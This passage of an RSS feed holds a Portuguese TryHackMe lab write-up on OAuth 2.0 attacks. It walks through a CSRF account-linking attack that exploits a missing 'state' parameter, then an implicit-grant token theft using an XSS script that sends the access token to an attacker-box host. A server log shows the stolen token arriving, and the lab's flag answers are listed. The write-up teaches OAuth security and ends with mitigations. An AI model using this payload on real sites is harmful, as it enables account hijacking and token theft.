+    &lt;a href=&#34;#csrf-no-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;O parâmetro &lt;code&gt;state&lt;/code&gt;protege contra ataca de CSRF, no qual ocorre quando um atacante induz o usuário a executar uma ação desnecessária, o ataque a CSRF leva a um acesso não autorizado aos recursos e pode comprometer o fluxo do OAuth. O &lt;code&gt;state&lt;/code&gt; ajuda a mitigar esses ataques, mantendo a integridade no processo de autorização.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;fraqueza-ou-falta-do-parâmetro&#34;&gt;Fraqueza ou falta do parâmetro&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;fraqueza-ou-falta-do-parâmetro&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#fraqueza-ou-falta-do-par%c3%a2metro&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O parâmetro &lt;code&gt;state&lt;/code&gt;é uma string arbitrária, está incluída na requisição feita pela aplicação cliente, quando o servidor de autorização recebe a requisição, é verificado as credenciais e é redirecionado de volta para aplicação cliente, o código de autorização junto com o parâmetro &lt;code&gt;state&lt;/code&gt;. O cliente verifica se corresponde o valor no parâmetro que foi inicialmente enviado, esse processo de validação garante que a resposta é legítima no fluxo do OAuth.&lt;/p&gt;
+&lt;p&gt;A vulnerabilidade ocorre quando há a falta do parâmetro, valor fixo ou uma sequência de número de fácil adivinhação. O atacante pode redirecionar o usuário para o domínio que está sob controle, depois que ele efetuar a autenticação e autorização no servidor de autorização.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;prática&#34;&gt;Prática&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;prática&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pr%c3%a1tica&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Nessa prática será explorada a ausência do parâmetro, primeiro faremos na perspectiva do atacante. Acessando a URL abaixo, realizamos o sincronismo de contas com o &lt;code&gt;CoffeShopApp&lt;/code&gt;, iremos utilizar as credenciais de atacante: &lt;code&gt;attacker:attacker&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Link:&lt;code&gt;http://mycontacts.thm:8080/csrf/index.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Após autenticado clicamos em &amp;ldquo;Sync Contacts&amp;rdquo; , somos redirecionado para &lt;code&gt;coffe.thm&lt;/code&gt;, analisando a URL identificamos que não possui o parâmetro &lt;code&gt;state&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/get_syn_contacts.png&#34; alt=&#34;get_sync&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;resumo-do-ataque&#34;&gt;Resumo do ataque:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;resumo-do-ataque&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#resumo-do-ataque&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Login como Atacante:&lt;/strong&gt; Você usa as credenciais do atacante para obter seu próprio código de autorização.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Preparo do Payload:&lt;/strong&gt; Com esse código de autorização, você prepara um payload malicioso.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Envio à Vítima:&lt;/strong&gt; A vítima, ao clicar no link malicioso, associa a conta OAuth dela à conta do atacante.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 data-hextra-search-id=&#34;ataque&#34;&gt;Ataque&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;ataque&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ataque&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Acessamos o link abaixo, utilizando as credenciais: &lt;code&gt;attacker:tesla@123&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Link&lt;/strong&gt;: &lt;code&gt;http://coffee.thm:8000/o/authorize/?response_type=code&amp;amp;client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&amp;amp;redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Obtemos o código de autorização do atacante.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;oudFyfzhrfgYwNQtbvnUwKY9fXlRNg&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Payload&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://bistro.thm:8080/csrf/callbackcsrf.php?code=oudFyfzhrfgYwNQtbvnUwKY9fXlRNg&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Com o payload preparado, enviamos para vítima, podemos realizar um ataque de &lt;em&gt;phising&lt;/em&gt; para o envio. Após a vítima clicar no link será solicitada suas credenciais, e após fornece-las a conta da vítima será vinculada a conta do atacante. Sem o parâmetro &lt;code&gt;state&lt;/code&gt;, o servidor de autorização não consegue determinar se a solicitação de autorização é legítima ou maliciosa, demonstrando como a ausência do parâmetro &lt;code&gt;state&lt;/code&gt; pode ser explorada para ataques CSRF em fluxos OAuth. Abaixo a visão da vítima após autenticar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/sync_flag.png&#34; alt=&#34;sync_flag&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag value after attaching the attacker&amp;rsquo;s account with the victim&amp;rsquo;s account?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;THM{CONTACTS_SYNCED}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What parameter name does the client application include in the authorization request to avoid CSRF attacks?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;state&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;fluxo-de-concessão-implícita&#34;&gt;Fluxo de Concessão Implícita&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;fluxo-de-concessão-implícita&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#fluxo-de-concess%c3%a3o-impl%c3%adcita&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;É enviado diretamente para o cliente, sem a necessidade de um código de autorização. É usado principalmente por aplicações &lt;em&gt;single-page&lt;/em&gt; e desenhado para clientes públicos que não conseguem armazenar com segurança os &lt;em&gt;client secrets&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;As fraquezas são:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Exposição do token de acesso na URL&lt;/li&gt;
+&lt;li&gt;Inadequada validação do redirecionamento de URIs.&lt;/li&gt;
+&lt;li&gt;Ausência na implementação de HTTPS.&lt;/li&gt;
+&lt;li&gt;Inadequado manuseio do token de acesso.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;prática-1&#34;&gt;Prática&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;prática-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pr%c3%a1tica-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O usuário acessa &lt;code&gt;http://factbook.thm:8080&lt;/code&gt;, está página permite que o usuário sincronize todos os seus status de &lt;code&gt;CoffeShoApp&lt;/code&gt;. Clicando no botão &amp;ldquo;&lt;strong&gt;Sync Statuses from CoffeeShopApp&lt;/strong&gt;&amp;rdquo; o processo é iniciado, o usuário é redirecionado para &lt;code&gt;CoffeShopApp&lt;/code&gt;onde irá se autenticar com as credenciais: &lt;code&gt;victim:victim123&lt;/code&gt;.
+Após isso, é feito a concessão implícita o usuário é redirecionado de volta para &lt;code&gt;factbook&lt;/code&gt;, o token de acesso se encontra na URL.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/get_callback.png&#34; alt=&#34;get_callback&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;A página onde o usuário realiza a postagem de status é vulnerável a XSS.
+Na perspectiva do atacante, essa vulnerabilidade é explorada,  injetando o código malicioso, exemplo fornecido em aula.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;reduce&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parts&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;parts&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parts&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{}); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;accessToken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;access_token&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;(); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;img&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://ATTACKBOX_IP:8081/steal_token?token=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;accessToken&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;window.location.hash&lt;/code&gt; obtém a parte do URL após o &lt;code&gt;#&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;substr(1)&lt;/code&gt; remove o &lt;code&gt;#&lt;/code&gt;, deixando apenas o fragmento relevante.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;hash.split(&#39;&amp;amp;&#39;)&lt;/code&gt; separa o fragmento em pares de chave-valor (ex., &lt;code&gt;[&amp;quot;access_token=12345&amp;quot;, &amp;quot;token_type=Bearer&amp;quot;]&lt;/code&gt;).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;reduce&lt;/code&gt; cria um objeto (&lt;code&gt;res&lt;/code&gt;) onde cada chave-valor do fragmento é separado e armazenado.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Extrai o valor do &lt;code&gt;access_token&lt;/code&gt; do objeto &lt;code&gt;result&lt;/code&gt;, armazenando-o na variável &lt;code&gt;accessToken&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Cria uma nova imagem (&lt;code&gt;new Image()&lt;/code&gt;).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Define o &lt;code&gt;src&lt;/code&gt; da imagem como uma URL contendo o token de acesso.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;O token de acesso do usuário é enviado para o atacante através da imagem, e assim o atacante obtém acesso ao recurso protegido.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell-session&#34; data-lang=&#34;shell-session&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@ip-10-10-162-175:~# python3 -m http.server 8081
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.9.2.217 - - [27/Aug/2024 19:30:10] &amp;#34;GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1&amp;#34; 404 -
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;What symbol separates the access token from the OAuth 2.0 implicit grant flow URL?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;#&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Visit the URL &lt;code&gt;http://coffee.thm:8080/flagvalidator/&lt;/code&gt; and enter the access token you acquired. What is the flag value?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;THM{TOKEN_HACKED}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;outras-vulnerabilidades-e-evolução-do-oauth-21&#34;&gt;Outras Vulnerabilidades e Evolução do OAuth 2.1&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;outras-vulnerabilidades-e-evolução-do-oauth-21&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#outras-vulnerabilidades-e-evolu%c3%a7%c3%a3o-do-oauth-21&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Os invasores podem explorar várias outras fraquezas críticas nas implementações do OAuth 2.0. A seguir estão algumas vulnerabilidades adicionais.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;expiração-de-token-insuficiente&#34;&gt;Expiração de Token Insuficiente&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;expiração-de-token-insuficiente&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#expira%c3%a7%c3%a3o-de-token-insuficiente&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Tokens de acesso com vidas longas ou infinitas representam um risco de segurança significativo. Se um invasor obtiver tal token, ele poderá acessar recursos protegidos indefinidamente.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;ataques-de-repetição&#34;&gt;Ataques de Repetição&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;ataques-de-repetição&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ataques-de-repeti%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Ataques de repetição envolvem capturar tokens válidos e reutilizá-los para obter acesso não autorizado. Os invasores podem explorar tokens várias vezes sem mecanismos para detectar e impedir a reutilização de tokens.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;armazenamento-inseguro-de-tokens&#34;&gt;Armazenamento Inseguro de Tokens&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;armazenamento-inseguro-de-tokens&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#armazenamento-inseguro-de-tokens&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Armazenar tokens de acesso e tokens de atualização de forma insegura (por exemplo, em armazenamento local ou arquivos não criptografados) pode levar ao roubo de tokens e acesso não autorizado. Usar mecanismos de armazenamento seguros, como cookies seguros ou bancos de dados criptografados, pode proteger os tokens de serem acessados ​​por agentes maliciosos.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;evolução-do-oauth-21&#34;&gt;Evolução do OAuth 2.1&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;evolução-do-oauth-21&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#evolu%c3%a7%c3%a3o-do-oauth-21&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;OAuth 2.1 representa a mais recente iteração na evolução do padrão OAuth, construído sobre a fundação do OAuth 2.0 para abordar suas deficiências e aumentar a segurança. A jornada do OAuth 2.0 para o OAuth 2.1 foi impulsionada pela necessidade de mitigar vulnerabilidades conhecidas e incorporar as melhores práticas que surgiram desde que a especificação original foi publicada. OAuth 2.0, embora amplamente adotado, tinha várias áreas que exigiam melhorias, particularmente em termos de segurança e interoperabilidade.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Uma das atualizações mais significativas é a descontinuação do tipo de concessão implícita.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Além disso, o OAuth 2.1 exige o uso do parâmetro &lt;code&gt;state&lt;/code&gt; para proteção contra ataques CSRF.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;O OAuth 2.1 também enfatiza a importância do manuseio e armazenamento seguros de tokens.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Além disso, o OAuth 2.1 aprimora a interoperabilidade ao fornecer diretrizes mais claras para validação de URI de redirecionamento, autenticação de cliente e validação de escopo.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Which of the following has been omitted from OAuth 2.1?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;a) Implicit Grant&lt;br&gt;
+b) Authorization Code&lt;br&gt;
+c) Tokens&lt;br&gt;
+d) State&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;conclusão&#34;&gt;Conclusão&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;conclusão&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conclus%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Com isso, temos uma melhor compreensão do que é o OAuth 2.0, de seu funcionamento em diversos cenários, e também das vulnerabilidades conhecidas e frequentemente exploradas nos sistemas atuais.
+Implementações seguras de OAuth exigem atenção cuidadosa aos detalhes, como a expiração apropriada de tokens, armazenamento seguro de credenciais e uso rigoroso de parâmetros como redirect_uri e state para prevenir ataques de CSRF e hijack tokens.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
